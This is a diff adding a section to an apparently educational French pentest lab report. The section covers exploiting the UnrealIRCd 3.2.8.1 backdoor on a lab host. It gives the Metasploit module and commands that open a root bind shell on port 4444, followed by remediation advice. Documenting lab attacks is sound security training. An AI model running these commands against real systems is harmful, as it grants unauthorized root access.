@@ -60,3 +60,34 @@ listes connues + sa longueur/complexité.
 - Politique de mots de passe forts (longueur, complexité, non-réutilisation).
 - Algorithme de hachage moderne (bcrypt/argon2) au lieu du vieux MD5crypt.
 - Déploiement d'un gestionnaire de mots de passe + MFA.
+
+## 6. Second exploit : backdoor UnrealIRCd 3.2.8.1
+
+### Contexte
+Service : serveur IRC UnrealIRCd, port 6667.
+Version 3.2.8.1 distribuée avec une backdoor insérée dans le code source
+officiel (compromission de la chaine de distribution).
+
+### Exploitation
+    use exploit/unix/irc/unreal_ircd_3281_backdoor
+    set RHOSTS 192.168.188.3
+    set payload cmd/unix/bind_perl
+    exploit
+
+Le payload "bind" fait ouvrir un port (4444) sur la cible, auquel Kali se
+connecte pour obtenir un shell.
+
+### Impact
+Shell obtenu avec les droits root (uid=0) via une technique differente
+du FTP : contournement par un service de chat.
+
+![Exploitation UnrealIRCd - accès root via bind shell](../screenshots/phase2-unrealircd.png)
+
+### Notion clé : exploit vs payload
+- Exploit = la faille exploitée pour entrer
+- Payload = le code exécuté une fois entré (ici un bind shell)
+
+### Remédiation
+- Mettre a jour UnrealIRCd vers une version saine et vérifiée.
+- Contrôler l'intégrité des sources téléchargées (signatures GPG, hashes).
+- Restreindre l'accès au port IRC par pare-feu si le service n'est pas public.
